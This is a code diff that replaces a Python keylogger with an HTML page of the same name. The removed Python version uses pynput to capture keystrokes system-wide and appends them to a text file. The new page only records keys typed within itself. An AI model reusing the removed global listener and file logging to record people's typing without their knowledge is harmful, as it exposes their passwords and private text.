@@ -1,50 +1,44 @@
-from pynput import keyboard
-import tkinter as tk
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Key Logger</title>
+</head>
+<body>
+    <h1>Web Key Logger</h1>
+    <textarea id="logArea" rows="10" cols="50" readonly></textarea>
+    <button id="startButton">Start Logging</button>
+    <button id="stopButton">Stop Logging</button>
 
+    <script>
+        let isLogging = false;
+        let logArea = document.getElementById('logArea');
+        let startButton = document.getElementById('startButton');
+        let stopButton = document.getElementById('stopButton');
 
-class KeyLogger:
-    def __init__(self, filename: str = "kahot.txt"):
-        self.filename = filename
-        self.root = tk.Tk()
-        self.root.title("Key Logger")
-        self.text_area = tk.Text(self.root, height=10, width=50)
-        self.text_area.pack(pady=10)
-        self.start_button = tk.Button(self.root, text="Start Logging", command=self.start_logging)
-        self.start_button.pack(pady=5)
-        self.stop_button = tk.Button(self.root, text="Stop Logging", command=self.stop_logging)
-        self.stop_button.pack(pady=5)
-        self.is_logging = False
+        startButton.addEventListener('click', function() {
+            isLogging = true;
+            logArea.value = 'Logging started...\n';
+            startButton.disabled = true;
+            stopButton.disabled = false;
+        });
 
-    @staticmethod
-    def get_char(key):
-        try:
-            return key.char
-        except AttributeError:
-            return str(key)
+        stopButton.addEventListener('click', function() {
+            isLogging = false;
+            logArea.value += '\nLogging stopped.';
+            startButton.disabled = false;
+            stopButton.disabled = true;
+        });
 
-    def on_press(self, key):
-        if self.is_logging:
-            char = self.get_char(key)
-            self.text_area.insert(tk.END, char)
-            with open(self.filename, 'a') as logs:
-                logs.write(char)
-
-    def start_logging(self):
-        self.is_logging = True
-        self.text_area.delete(1.0, tk.END)
-        self.text_area.insert(tk.END, "Logging started...")
-
-    def stop_logging(self):
-        self.is_logging = False
-        self.text_area.insert(tk.END, "\nLogging stopped.")
-
-    def main(self):
-        listener = keyboard.Listener(on_press=self.on_press)
-        listener.start()
-        self.root.mainloop()
-
-
-if __name__ == '__main__':
-    logger = KeyLogger()
-    logger.main()
-    input()
+        document.addEventListener('keydown', function(event) {
+            if (isLogging) {
+                let char = event.key;
+                if (char.length === 1) {
+                    logArea.value += char;
+                }
+            }
+        });
+    </script>
+</body>
+</html>
